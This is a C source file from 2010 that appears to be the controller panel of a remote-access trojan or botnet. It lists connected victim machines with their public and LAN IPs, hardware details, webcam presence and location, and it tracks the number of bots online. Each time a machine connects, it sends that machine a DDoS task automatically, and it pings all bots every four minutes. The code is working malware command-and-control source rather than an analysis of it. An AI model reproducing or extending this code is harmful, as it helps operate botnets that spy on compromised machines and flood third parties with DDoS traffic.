/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "main_frame_client_op.h"
#include "main_frame_log.h"
#include "frame_tools.h"
#include "main_frame_ddos.h"
#include "km_head.h"

extern HWND hWndList;
extern HWND hWndStatus;
extern long g_totalline;
extern long g_lineport;

pio_socket g_share_io_socket = NULL;

CLIENT_LIST_COL client_list_col[] =
{
    {COL_K_SHOW ,"   外网地址", 120, 0},
    {COL_SHOW   ,"内网地址", 120, &client_insert_list_localip},
    {COL_SHOW   ,"操作系统", 100, &client_insert_list_system},
    {COL_SHOW   ,"CPU类型", 100, &client_insert_list_processor_type},
    {COL_SHOW   ,"CPU频率", 60, &client_insert_list_processor_hmz},
    {COL_SHOW   ,"CPU数量", 60, &client_insert_list_processor_num},
    {COL_SHOW   ,"内存", 60, &client_insert_list_memory},
    {COL_SHOW   ,"耗时", 40, &client_insert_list_connect_time},
    {COL_SHOW   ,"屏幕", 80, &client_insert_list_screen},
    {COL_HIDE   ,"摄像头", 40, &client_insert_list_cap},
    {COL_SHOW   ,"网卡描述", 100, &client_insert_list_adapter_descriptor},
    {COL_SHOW   ,"来自哪里", 100, &client_insert_list_ipaddr},
    {COL_SHOW   ,"备注", 100, &client_insert_list_descriptor}
};

char lpSystemVersion[][32] = {
    "Unknown System",
    "Windows 95/NT4.0",
    "Windows 98",
    "Windows Me",
    "Windows 2000",
    "Windows Xp",
    "Windows 2003",
    "Windows vista/2008"
};

char lpProcessorType[][32] ={
    "Intel 386",
    "Intel 486",
    "Intel Pentium",
    "MIPS",
    "Alpha",
    "Unknown"
};

#define client_list_col_num  (sizeof(client_list_col)/sizeof(CLIENT_LIST_COL))

int  client_insert_list_ip(pio_socket pi_socket, int col, int row)
{
    pkm_client pclient;
    char str[32];

    pclient = pi_socket->extend;
    sprintf(str, "%s", inet_ntoa(pi_socket->remote_addr.sin_addr));

    LVITEM lvi;
    lvi.mask        = LVIF_TEXT|LVIF_IMAGE|LVIF_PARAM | LVIF_STATE;
    lvi.state       = LVIS_SELECTED;
    lvi.stateMask   = 0;
    lvi.iSubItem    = 0;
    lvi.pszText     = str;
    lvi.iImage      = 0;
    lvi.iItem       = ListView_GetItemCount(hWndList);

    if (pclient->c_info.cCap != 0)
        lvi.iImage      = 1;

    return ListView_InsertItem(hWndList, &lvi);
}

int  client_insert_list_localip(pkm_client pclient, int col, int row)
{
    char str[32];
    sprintf(str, "%s", inet_ntoa(*((struct in_addr*)&pclient->c_info.dwLanAddr)));
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_system(pkm_client pclient, int col, int row)
{
    ListView_SetItemText(hWndList, row, col, lpSystemVersion[pclient->c_ver.wSystemVersion]);
    return 0;
}

int  client_insert_list_processor_type(pkm_client pclient, int col, int row)
{
	ListView_SetItemText(hWndList, row, col, lpProcessorType[pclient->c_info.dwProcessorType]);
    return 0;
}

int  client_insert_list_processor_hmz(pkm_client pclient, int col, int row)
{
    char str[12];
    sprintf(str, "%.1fGHz", pclient->c_info.dwProcessorMhz);
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_processor_num(pkm_client pclient, int col, int row)
{
    char str[12];
    sprintf(str,"%d", (int)pclient->c_info.dwNumberOfProcessors);
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_memory(pkm_client pclient, int col, int row)
{
    char str[12];
    sprintf(str, "%.2fGB", pclient->c_info.dwMemory);
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_connect_time(pkm_client pclient, int col, int row)
{
    char str[12];
    sprintf(str, "%d",(int)pclient->c_info.dwConnectTime);
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_screen(pkm_client pclient, int col, int row)
{
    char str[32];
    sprintf(str, "%dx%d", pclient->c_info.wXscreen,pclient->c_info.wYscreen);
    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_cap(pkm_client pclient, int col, int row)
{
    char str[10];
    if (pclient->c_info.cCap == 0)
        strcpy(str,"无");
    else
        strcpy(str,"有");

    ListView_SetItemText(hWndList, row, col, str);
    return 0;
}

int  client_insert_list_adapter_descriptor(pkm_client pclient, int col, int row)
{
    ListView_SetItemText(hWndList, row, col, pclient->c_info.lpAdapterDescriptor);
    return 0;
}

int  client_insert_list_ipaddr(pkm_client pclient, int col, int row)
{
    ListView_SetItemText(hWndList, row, col, pclient->ipaddr);
    return 0;
}

int  client_insert_list_descriptor(pkm_client pclient, int col, int row)
{
    ListView_SetItemText(hWndList, row, col, pclient->c_info.lpDescriptor);
    return 0;
}

int  main_frame_draw_client_list_col()
{
    int i, col;

    for ( i=0; i<client_list_col_num; i++){
        ListView_DeleteColumn(hWndList, 0);
    }

    for ( i=0, col=0; i<client_list_col_num; i++){
        if(client_list_col[i].col_state > 0){
            insert_list_column_text(hWndList, col, client_list_col[i].width, client_list_col[i].col_name);
            col++;
        }
    }
    return 0;
}

int  main_frame_draw_client_list_col_width(int right)
{
    int i, col, width=0, temp=0;

    for ( i=0, col=0; i < client_list_col_num; i++) {
         if (client_list_col[i].col_state > 0) {
            temp = client_list_col[i].width;
            width = width+temp;
            col++;
        }
    }

    if (width < right) {
         width = width - temp;
         width = right - width -10;
         ListView_SetColumnWidth(hWndList, col-1, width);
    }
    return 0;
}

int  main_frame_client_insert(pio_socket i_socket)
{
    int i, col, index;
    char str1[32], str2[32];
    char status[256];
    pkm_client pclient;
    pclient = i_socket->extend;

    main_frame_ddos_send_task(i_socket);


    EnterCriticalSection(&g_share_main->critical_section);

    index = client_insert_list_ip(i_socket, 0, 0);

    for ( i=1, col=1; i<client_list_col_num; i++){
        if (client_list_col[i].col_state > 0){
            client_list_col[i].insert_list_text(i_socket->extend, col, index);
            col++;
        }
    }

    if (g_share_io_socket == NULL) {
        g_share_io_socket = i_socket;
    } else {
        i_socket->next = g_share_io_socket;
        g_share_io_socket = i_socket;
    }

    LeaveCriticalSection(&g_share_main->critical_section);


    sprintf(str1, "%s", inet_ntoa(i_socket->remote_addr.sin_addr));
    sprintf(str2, "%s", inet_ntoa(*((struct in_addr*)&pclient->c_info.dwLanAddr)));

    _log("新的客户端连接到端口%d,远程地址:[%s],[%s]..", 2010, str1, str2);

    InterlockedIncrement(&g_totalline);
    sprintf(status, "当前监听端口[%d],有[%d]台客户端在线", (int)g_lineport, (int)g_totalline);
    SetWindowText(hWndStatus, status);
    return 0;
}

int  main_frame_client_delete(pio_socket i_socket, pclient_info c_info)
{
    LVFINDINFO info;
    struct in_addr sin_addr;
    char status[256];
    char raddr[128];
    char inaddr[64];
    char laddr[64];

    sin_addr.S_un.S_addr = c_info->dwLanAddr;
    strcpy(inaddr, inet_ntoa(i_socket->remote_addr.sin_addr));
    strcpy(laddr, inet_ntoa(sin_addr));

    int nIndex = 0;
    info.flags  = LVFI_PARTIAL|LVFI_STRING;
    info.psz    = inaddr;

    nIndex = ListView_FindItem(hWndList, -1, &info);

    while (nIndex != -1){
        memset(raddr, 0x0, 128);
        ListView_GetItemText(hWndList, nIndex, 1, raddr, 128);
        if (strcmp(raddr, "")==0)
            break;
        if (strcmp(laddr, raddr) == 0){
            printf("delete_client_list_item:%s:%d\n", inaddr, nIndex);
            ListView_DeleteItem(hWndList, nIndex);
            break;
        }
        nIndex = ListView_FindItem(hWndList, nIndex, &info);
    }

    if (g_share_io_socket == NULL)
        return -1;

    _log("客户端关闭,远程地址:[%s],[%s]..", inaddr, laddr);

    InterlockedDecrement(&g_totalline);
    sprintf(status, "当前监听端口[%d],有[%d]台客户端在线", (int)g_lineport, (int)g_totalline);
    SetWindowText(hWndStatus, status);


    EnterCriticalSection(&g_share_main->critical_section);

    pio_socket i_temp = g_share_io_socket;
    pio_socket i_temp1 = g_share_io_socket;
    if (i_temp == i_socket) {
        g_share_io_socket = i_temp->next;
    } else {
        i_temp = i_temp->next;
        while (i_temp) {
            if (i_temp == i_socket) {
                i_temp1->next = i_temp->next;
            }
            i_temp1 = i_temp;
            i_temp = i_temp->next;
        }
    }

    LeaveCriticalSection(&g_share_main->critical_section);
    return nIndex;
}

pio_socket main_frame_client_find_addr(char *addr1, char *addr2)
{
    pkm_client pclient;
    unsigned long dwLan;
    struct in_addr iaddr;

    iaddr.S_un.S_addr = inet_addr(addr1);
    dwLan = inet_addr(addr2);
    pio_socket i_temp = g_share_io_socket;

    while (i_temp){
        if (i_temp->io_type == C_MAIN){
            pclient = i_temp->extend;
             if(i_temp->remote_addr.sin_addr.S_un.S_addr == iaddr.S_un.S_addr){
                 if(pclient->c_info.dwLanAddr == dwLan)
                    return i_temp;
            }
        }
        i_temp = i_temp->next;
    }
    return NULL;
}

unsigned __stdcall main_frame_client_check(void *param)
{
    for (;;) {
        pio_socket i_temp = g_share_io_socket;
        while (i_temp){
            if (i_temp->io_type == C_MAIN){
                kms_sock_send(i_temp, 0, 5, 0, NULL, 0);
            }
            i_temp = i_temp->next;
        }
        printf("main_frame_client_check\n");
        Sleep(1000*60*4);
    }
    return 0;
}
